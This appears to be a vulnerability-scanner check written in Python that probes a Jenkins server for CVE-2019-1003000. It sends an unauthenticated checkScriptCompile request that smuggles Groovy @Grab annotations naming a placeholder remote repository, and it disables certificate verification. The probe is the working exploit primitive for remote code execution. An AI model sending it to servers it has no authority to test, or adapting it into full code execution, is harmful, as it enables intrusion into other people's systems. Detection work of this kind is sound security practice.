# -*- coding:utf-8 -*-

import ssl
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

ssl._create_default_https_context = ssl._create_unverified_context

def verify(protocol,ip,port):
    url = protocol + '://' + ip + ':' + str(port)
    print('testing if CVE-2019-1003000 jenkins script security and pipeline plugin rce vul')
    poc = '/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition/checkScriptCompile?value=@GrabConfig(disableChecksums=true)%0a@GrabResolver(name=%27test%27,%20root=%27http://aaa%27)%0a@Grab(group=%27package%27,%20module=%27vultestvultest%27,%20version=%271%27)%0aimport%20Payload;'
    try:
        newurl = url + poc
        res = requests.get(newurl,verify=False, timeout=5)
        if res.status_code == 200 and 'package#vultestvultest' in res.text:
            msg = 'There is a CVE-2019-1003000 jenkins script security and pipeline plugin rce vul on %s' % url
            print(msg)
            number = 'v116'
            return True, url, number, msg
        else:
            pass
    except Exception as e:
        msg = str(e)
        number = 'v0'
        return False,url,number,msg
    msg = 'There is no CVE-2019-1003000 jenkins script security and pipeline plugin rce vul'
    number = 'v0'
    return False,url,number,msg



